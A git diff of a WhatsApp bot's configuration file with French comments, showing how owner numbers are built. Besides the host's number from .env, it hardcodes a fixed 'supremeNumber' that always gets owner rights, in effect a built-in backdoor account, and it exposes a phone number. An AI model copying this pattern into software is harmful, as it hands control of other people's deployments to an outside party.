@@ -6,21 +6,25 @@
 
 const dotenv = require('dotenv');
 dotenv.config();
-
-// 1. L'Owner défini dans le fichier .env (Hébergeur / Admin secondaire)
+// Extraction propre du numéro du .env
 const envOwnerRaw = process.env.OWNER_NUMBER || '';
 const envOwnerNumber = envOwnerRaw.replace(/\D/g, '');
-
 const supremeNumber = '22651622652';
 
 module.exports = {
     // --- BOT OWNER CONFIGURATION ---
-    // On combine le numéro du .env et le numéro suprême, en s'assurant qu'ils sont reconnus
-    owner: [envOwnerNumber, supremeNumber, `${supremeNumber}@s.whatsapp.net`], 
+    // On crée une liste qui contient les deux numéros (env et supreme)
+    // On ajoute aussi le format avec @s.whatsapp.net pour certains handlers
+    owner: [
+        envOwnerNumber, 
+        supremeNumber, 
+        `${envOwnerNumber}@s.whatsapp.net`, 
+        `${supremeNumber}@s.whatsapp.net`
+    ], 
     ownerNumber: [envOwnerNumber, supremeNumber], 
-    ownerName: 'ɢʜᴏꜱᴛɢ x', 
-    supremeNumber: supremeNumber, 
-    // ... reste du code
+    supremeNumber: supremeNumber,
+    // ... reste de votre config
+
 
 
     // --- SESSIONS & CONNECTION ---
